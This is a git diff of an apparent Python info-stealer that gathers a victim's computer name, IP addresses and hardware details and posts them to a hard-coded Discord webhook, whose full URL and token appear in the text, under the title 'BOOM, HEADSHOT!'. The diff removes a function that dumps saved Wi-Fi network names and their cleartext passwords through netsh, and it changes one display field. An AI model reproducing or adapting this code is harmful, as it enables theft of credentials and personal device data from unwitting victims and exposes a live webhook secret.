@@ -11,23 +11,6 @@ private_ip = socket.gethostbyname(socket.gethostname())
 public_ip = socket.gethostbyname(socket.getfqdn())
 token = "https://discord.com/api/webhooks/1085439407512891423/KQILUDIPVggOdMGVuXl5BmMj4j7Yer-nk-W3FrsXBiHuEMBgZyM_mHixIFLuj-0VHKrZ"
 
-def wifistealer():
-    data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8').split('\n')
-    profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
-
-    results = ""
-    for i in profiles:
-        try:
-            output = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('utf-8').split('\n')
-            output = [b.split(":")[1][1:-1] for b in output if "Key Content" in b]
-            results += f"{i}: {output[0]}\n"
-        except IndexError:
-            results += f"{i}: \n"
-    
-    return results
-
-wifistolen = wifistealer()
-
 embed = {
     "title": "BOOM, HEADSHOT!",
     "description": computer_name,
@@ -41,7 +24,7 @@ embed = {
         {
             "name": "Device Details",
             "value": f"Public IP: {hwid}\nPrivate IP: {mac_address}",
-            "inline": True
+            "inline": False
         }
     ],
     "footer": {
